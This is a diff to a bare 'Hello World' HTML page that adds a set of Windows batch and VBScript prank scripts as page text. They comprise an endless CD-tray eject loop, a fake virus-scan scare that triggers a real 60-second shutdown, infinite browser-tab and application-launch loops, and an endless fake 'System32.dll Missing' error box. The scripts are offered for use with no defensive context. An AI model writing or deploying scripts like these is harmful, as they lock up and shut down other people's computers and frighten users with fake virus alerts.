@@ -3,5 +3,59 @@
 <head>
 <body>
   <p>Hello World</p>
+  <br>
+                   For disk drive
+  @echo off
+:loop
+echo Set oWMP = CreateObject("WMPlayer.OCX.7") > eject.vbs
+echo Set colCDROMs = oWMP.cdromCollection >> eject.vbs
+echo colCDROMs.Item(0).Eject >> eject.vbs
+echo colCDROMs.Item(0).Eject >> eject.vbs
+cscript eject.vbs
+del eject.vbs
+goto loop
+
+                      For Shceduled Shutdown
+  @echo off
+Title System Alert 
+color 0a
+
+echo CHECKING YOUR SYSTEM FOR ANY VIRUSES....
+timeout /t 2 >nul
+echo LOADING CRIRTICAL VIRUSES....
+timeout /t 2 >nul
+echo VIRUS DETECTED!
+timeout /t 2 >nul
+echo SHUTTING DOWN YOUR SYSTEM IN 60 SECONDS....
+
+shutdown /s /t 60 /c "SHUTTING DOWN IMMEDIATELY TO PREVENT FURTHER VIRUSES..."
+
+pause
+
+                     For web Tabs openings
+  @echo off
+:loop
+start https://www.google.com
+goto loop
+
+                      For Stealth apps
+  @echo off
+:top
+start /min "" "mspaint.exe"
+start /min "" "calc.exe"
+start /min "" "chrome.exe"
+timeout /t 3 >nul
+goto top
+
+                        For Messages 
+  do
+  MsgBox "Critical error: System32.dll Missing!", 16, "System Alert"
+loop
+
+                           to be continued
+
+
+  
 </body>
+
 </html>
